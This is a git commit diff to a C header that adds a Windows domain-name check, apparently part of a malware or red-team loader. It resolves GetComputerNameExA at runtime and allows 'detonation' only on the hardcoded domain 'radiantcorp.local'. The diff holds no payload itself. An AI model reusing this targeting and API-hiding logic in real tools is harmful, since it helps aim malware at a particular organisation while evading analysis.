7218cda50191d4bc4110be796dd14275f58a51dc
Pwnisher <ethancruize@gmail.com>
2021-02-09 01:52:04 +0530

    Update checks.h

--- checks.h
+++ checks.h
@@ -1,7 +1,58 @@
 // add checks to check Domain Name before Spawning
 
-void GetDomainName(){
+#include "headers.h"
+#include <winbase.h>
+
+#define UNLEN 256;
+
+typedef BOOL(WINAPI* _GetComputerNameExA)(
+    COMPUTER_NAME_FORMAT NameType,
+    LPSTR                lpBuffer,
+    LPDWORD              nSize
+    );
+
+int DomainCheck(){
+
+    // To Get AD Domain Name
+    COMPUTER_NAME_FORMAT name = ComputerNamePhysicalDnsDomain;
+
+    HMODULE Kernel32 = GetModuleHandleA("Kernel32.dll");
+   
+    _GetComputerNameExA GetComputerNameExA = (_GetComputerNameExA)GetProcAddress(Kernel32, "GetComputerNameExA");
+    if (GetComputerNameExA == NULL) {
+        return -1;
+    }
+
+    // Init some important variables
+    LPSTR lpBuffer[MAX_PATH];
+    DWORD dwLength = UNLEN + 1;
+    ZeroMemory(lpBuffer, MAX_PATH);
+
+    // Retrieve name
+    BOOL valid = GetComputerNameExA(name, (LPSTR)lpBuffer, &dwLength);
+    
+    if (!valid) {
+        printf("Failed to Get Domain Name\n");
+    }
+
+    printf("Domain is: %s\n", (LPSTR)lpBuffer);
+
+    char domnam[256] = "radiantcorp.local";
+
+    if (strcmp(domnam, (LPSTR)lpBuffer) == 0) {
+        // detonate only if domain name matched
+        printf("\nmatch\n");
+    }
+
+    return 0;
+}
 
 
+int checkinternet() {
 
+    // resolve github 
+
+ // dont wanna get those windns headers :(
+
+    return 0;
 }
